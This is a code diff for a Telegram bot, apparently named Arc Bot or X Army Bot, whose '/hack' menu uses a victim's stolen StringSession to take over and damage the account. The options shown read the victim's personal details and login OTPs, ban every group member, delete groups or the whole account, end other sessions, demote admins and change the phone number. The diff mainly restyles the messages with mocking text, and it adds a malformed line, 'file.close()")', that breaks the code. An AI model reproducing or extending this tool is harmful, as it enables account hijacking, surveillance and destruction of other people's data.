@@ -149,48 +149,45 @@ logging.basicConfig(level=logging.WARNING)
 channel = "TheXArmy"
 menu = '''
 
-**NOTICE JOIN [Arc Network](https://t.me/the_arc_network) FEDERATION**
+**ɴᴏᴛɪᴄᴇ ᴊᴏɪɴ** [**ᴛʜᴇ ᴀʀᴄ ɴᴇᴛᴡᴏʀᴋ**](https://t.me/the_arc_network)
 
 
-A: [check user own groups and channels]
+A: [ᴄʜᴇᴄᴋ ᴜsᴇʀ's ᴏᴡɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs]
 
-B: [check user all information like phone number usrname...]
+B: [ᴄʜᴇᴄᴋ ᴜsᴇʀ's ᴀʟʟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʟɪᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴜsʀɴᴀᴍᴇ...]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [ʙᴀɴ ᴀ ɢʀᴏᴜᴘ {ɢɪᴠᴇ ᴍᴇ 𝕊𝕥𝕣𝕚𝕟𝕘𝕊𝕖𝕤𝕤𝕚𝕠𝕟 ᴀɴᴅ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ ɪ ᴡɪʟʟ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴛʜᴇʀᴇ}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [ᴋɴᴏᴡ ᴜsᴇʀ's ʟᴀsᴛ ᴏᴛᴘ {1 sᴛ ᴜsᴇ ᴏᴘᴛɪᴏɴ ʙ ᴛᴀᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏɢɪɴ ᴛʜᴇʀᴇ ᴀᴄᴄᴏᴜɴᴛ ᴛʜᴇɴ ᴜsᴇ ᴍᴇ ɪ ᴡɪʟʟ ɢɪᴠᴇ ʏᴏᴜ ᴏᴛᴘ}][2 sᴛᴇᴘ ʜᴜᴀ ᴛʜᴏ ʙʏᴇ ʙʏᴇ ᴛᴀᴛᴀ ᴋʜᴀᴛᴀᴍ 😂]
 
-E: [Join A Group/Channel via StringSession]
+E: [ᴊᴏɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ sᴛʀɪɴɢsᴇssɪᴏɴ]
 
-F: [Leave A Group/Channel via StringSession]
+F: [ʟᴇᴀᴠᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ sᴛʀɪɴɢsᴇssɪᴏɴ]
 
-G: [Delete A Group/Channel]
+G: [ᴅᴇʟᴇᴛᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]
 
-H: [Check user two step is eneable or disable]
+H: [ᴄʜᴇᴄᴋ ᴡʜᴇᴛʜᴇʀ ᴜsᴇʀ's ᴛᴡᴏ sᴛᴇᴘ ɪs ᴇɴᴀʙʟᴇᴅ ᴏʀ ᴅɪsᴀʙʟᴇᴅ]
 
-I: [Terminate All current active sessions except Your StringSession]
+I: [ᴛᴇʀᴍɪɴᴀᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ᴇxᴄᴇᴘᴛ ʏᴏᴜʀ sᴛʀɪɴɢsᴇssɪᴏɴ ]
 
-J: [Delete Account]
+J: [ᴅᴇʟᴇᴛᴇ ᴀᴄᴄᴏᴜɴᴛ]
 
-K: [Demote all admins in a group/channel]
+K: [ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴀᴅᴍɪɴs ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]
 
-L: [Promote a member in a group/channel]
+L: [ᴘʀᴏᴍᴏᴛᴇ ᴀ ᴍᴇᴍʙᴇʀ ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]
 
-M: [Change Phone number using StringSession]
+M: [ᴄʜᴀɴɢᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴜsɪɴɢ sᴛʀɪɴɢsᴇssɪᴏɴ]
 
-WE ADD ADD MORE FEATURES LATER 😆
+ᴡᴇ sʜᴀʟʟ ᴀᴅᴅ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ʟᴀᴛᴇʀ.
 '''
 mm = '''
-You can hack anybody
-Take his/her StringSession and use me
-I will give you full power of mine
-Type /hack
+ɪɴᴛʀᴏᴅᴜᴄᴛɪᴏɴ ᴋɪ ᴢᴀʀᴜʀᴀᴛ ɴᴀʜɪ ʜᴀɪ \n ᴛʏᴘᴇ /hack
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("ʙsᴅᴋ ᴘᴍ ᴍᴀɪ ᴍᴇssᴀɢᴇ ᴋʀ")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
@@ -205,192 +202,193 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("please use me in pm🥺")
+  await event.reply("ʙsᴅᴋ ᴘᴍ ᴍᴀɪ ᴍᴇssᴀɢᴇ ᴋʀ")
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
+    await x.send_message(f"ᴄʜᴏᴏsᴇ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴡɪᴛʜ sᴛʀɪɴɢ sᴇssɪᴏɴ 🤤 \n\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\ᴅᴇᴛᴀɪʟs ʙʏ [ᴛʜᴇ ᴀʀᴄ ɴᴇᴛᴡᴏʀᴋ](https://t.me/the_arc_network)")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\ɴ ᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
+        file.close()")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("ʙᴀɴɴɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("ᴊᴏɪɴᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("ʟᴇᴀᴠᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
         return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("ᴅᴇʟᴇᴛᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("ᴜsᴇʀ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ, ʏᴏᴜ ᴄᴀɴ ʟᴏɢɪɴ ᴀɴᴅ ʀᴇᴀᴅ ᴄʜᴀᴛs 😈")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("sᴏʀʀʏ ᴜsᴇʀ ʜᴀᴠᴇ ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴇᴅ.")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("ᴀʟʟ sᴇssɪᴏɴs ᴀʀᴇ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ.")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("ᴀᴄᴄᴏᴜɴᴛ ᴡᴀs ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ")
       grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
+      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴜsᴇʀɴᴀᴍᴇ")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("ɪ ᴀᴍ ᴘʀᴏᴍᴏᴛɪɴɢ ʏᴏᴜ ɪɴ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴡᴀɪᴛ ᴀ ᴍɪɴ")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("ɪ ᴀᴍ ᴅᴇᴍᴏᴛɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴏғ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴡᴀɪᴛ ᴀ ᴍɪɴ 😈")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
+      await x.send_message("ɢɪᴠᴇ ɴᴜᴍʙᴇʀ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʜᴀɴɢᴇ\n[ɴᴏᴛᴇ: ᴅᴏɴᴛ ᴜsᴇ 2ɴᴅʟɪɴᴇ ᴏʀ ᴛᴇxᴛɴᴏᴡ ɴᴜᴍʙᴇʀs]\n[ɪғ ʏᴏᴜ ᴀʀᴇ ᴜsᴇ 2ɴᴅ ʟɪɴᴇ ᴏʀ ᴛᴇxᴛ ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ'ᴛ ɢᴇᴛ ᴏᴛᴘ ᴜɴʟᴇss ʏᴏᴜ ʜᴀᴠᴇ ᴍᴏɴᴇʏ.] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n ᴄᴏᴘʏ ᴛʜᴇ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ʏᴏᴜ ɢᴏᴛ ᴏᴛᴘ\nɪ sᴛᴏᴘ ғᴏʀ 20 sᴇᴄ ᴄᴏᴘʏ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ ᴀɴᴅ ᴏᴛᴘ")
         await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
+        await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
+        await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴛʜᴇ ᴏᴛᴘ")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs ɴᴜᴍʙᴇʀ ᴡᴀs ᴄʜᴀɴɢᴇᴅ 😈")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("sᴏᴍᴇᴛʜɪɴɢ ɪs ᴡʀᴏɴɢ")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("sᴇɴᴅ ᴛʜɪs ᴇʀʀᴏʀ ᴛᴏ - @The_Arc_Support \n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("ᴡʀᴏɴɢ ᴛᴇxᴛ ғᴏᴜɴᴅ ʀᴇ-ᴛʏᴘᴇ /hack ᴀɴᴅ ᴜsᴇ")
 
 
 
